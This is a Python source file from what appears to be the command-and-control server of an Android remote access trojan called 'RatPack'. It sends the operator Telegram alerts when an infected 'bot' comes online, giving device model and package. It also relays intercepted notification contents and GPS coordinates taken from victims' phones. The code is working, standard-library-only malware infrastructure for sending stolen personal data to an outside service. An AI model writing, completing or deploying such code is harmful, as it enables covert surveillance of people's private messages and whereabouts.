"""
telegram.py — Telegram notifications for the operator.

The bot interface has no web UI, so the operator needs another way to learn
that a bot connected, that a command failed or that the server restarted.
Telegram gives them that with a token.

Only the standard library is used: the API is a plain HTTPS request.

Setup:
  1. create a bot with @BotFather, it gives you a token like 123456:ABC-DEF
  2. send the bot a single message (any text)
  3. that is all: the chat id is discovered automatically
"""
import json
import threading
import urllib.error
import urllib.parse
import urllib.request

API = "https://api.telegram.org"


def _request(url, data=None, timeout=15):
    """
    Performs a Telegram API call.

    GET for the methods that read, POST for the ones that send.
    """
    if data is None:
        req = urllib.request.Request(url)
    else:
        req = urllib.request.Request(url,
                                     data=urllib.parse.urlencode(data).encode(),
                                     method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def _post(method, token, payload, timeout=15):
    return _request(f"{API}/bot{token}/{method}", payload, timeout)


def _get(method, token, params=None, timeout=15):
    url = f"{API}/bot{token}/{method}"
    if params:
        url += "?" + urllib.parse.urlencode(params)
    return _request(url, None, timeout)


class Telegram:
    """
    Sends messages to the operator.

    The chat id is discovered from the bot's update queue: the operator only
    has to message the bot once. When several chats exist, the most recent
    one wins.

    Every call is best effort: a Telegram outage must never take the C2 down,
    so failures are logged and swallowed.
    """

    def __init__(self, token: str = "", chat_id: str = "", enabled: bool = False):
        self.token = token or ""
        self.chat_id = chat_id or ""
        self.enabled = bool(enabled and self.token)

    @classmethod
    def from_config(cls, cfg: dict):
        tg = (cfg or {}).get("telegram", {}) or {}
        return cls(tg.get("token", ""), tg.get("chat_id", ""),
                   bool(tg.get("enabled", False)))

    def configured(self) -> bool:
        """True when a token is present (the chat id is resolved lazily)."""
        return bool(self.token)

    def ready(self) -> bool:
        """True when a chat id is known and messages can be delivered."""
        return bool(self.token and self.chat_id)

    def discover_chat(self):
        """
        Finds the chat id from the bot's pending updates.

        Returns (chat_id, message). The chat id is empty when the operator
        has not messaged the bot yet.
        """
        if not self.token:
            return "", "no token"
        try:
            res = _get("getUpdates", self.token, {"timeout": 0, "limit": 100})
        except urllib.error.HTTPError as e:
            return "", f"Telegram API error: HTTP {e.code}"
        except Exception as e:
            return "", f"{type(e).__name__}: {e}"

        if not res.get("ok"):
            return "", res.get("description", "unknown error")

        updates = res.get("result", []) or []
        best = None
        for u in updates:
            for key in ("message", "edited_message", "channel_post",
                        "edited_channel_post"):
                m = u.get(key)
                if not m:
                    continue
                chat = m.get("chat") or {}
                cid = chat.get("id")
                if cid is None:
                    continue
                if best is None or (u.get("update_id", 0) >
                                    best.get("update_id", 0)):
                    best = {"update_id": u.get("update_id", 0), "id": cid,
                            "type": chat.get("type", "private"),
                            "title": chat.get("title") or chat.get("username")
                            or chat.get("first_name") or ""}
        if best is None:
            return "", ("no chat yet: message the bot once, "
                        "then re-run the setup")
        return str(best["id"]), best.get("title") or best["type"]

    def resolve(self):
        """
        Resolves the chat id if it is not known yet.

        Returns (ok, message).
        """
        if not self.token:
            return False, "no token configured"
        if self.chat_id:
            return True, f"chat {self.chat_id}"
        cid, info = self.discover_chat()
        if not cid:
            return False, info
        self.chat_id = cid
        return True, f"chat {cid} ({info})"

    def test(self):
        """Sends a test message; returns (ok, message)."""
        if not self.token:
            return False, "no token configured"
        ok, msg = self.resolve()
        if not ok:
            return False, msg
        try:
            res = _post("sendMessage", self.token,
                        {"chat_id": self.chat_id,
                         "text": "RatPack: Telegram notifications are working."})
            if res.get("ok"):
                return True, f"message sent to chat {self.chat_id}"
            return False, res.get("description", "unknown error")
        except Exception as e:
            return False, f"{type(e).__name__}: {e}"

    def send(self, text: str):
        """Sends a message in the background; never raises."""
        if not self.token:
            return False
        if not self.chat_id:
            # Find the chat lazily, without blocking the caller.
            threading.Thread(target=self._resolve_and_send, args=(text,),
                             daemon=True).start()
            return True
        threading.Thread(target=self._send_sync, args=(text,), daemon=True).start()
        return True

    def _resolve_and_send(self, text):
        try:
            ok, _ = self.resolve()
            if ok:
                self._send_sync(text)
        except Exception:
            pass

    def _send_sync(self, text: str):
        try:
            # Telegram rejects messages longer than 4096 characters.
            if len(text) > 4000:
                text = text[:4000] + "\n... (truncated)"
            _post("sendMessage", self.token, {"chat_id": self.chat_id,
                                               "text": text})
        except Exception:
            pass

    def notify_bot_online(self, bot_id: str, info: dict):
        model = info.get("model", "?")
        pkg = info.get("package", "?")
        self.send(f"[RatPack] bot online\nid: {bot_id}\ndevice: {model}\n"
                  f"package: {pkg}")

    def notify_bot_offline(self, bot_id: str):
        self.send(f"[RatPack] bot offline\nid: {bot_id}")

    def notify_event(self, bot_id: str, event: dict):
        """Forwards a short summary of an event."""
        kind = event.get("event", "event")
        if kind == "notification":
            title = event.get("title")
            text = event.get("text")
            body = " ".join(str(x) for x in (title, text) if x)
            self.send(f"[RatPack] notification {event.get('package','')}\n{body}")
        elif kind == "location":
            self.send(f"[RatPack] location {bot_id}\n"
                      f"{event.get('latitude')}, {event.get('longitude')}")
        else:
            self.send(f"[RatPack] {kind} from {bot_id}")
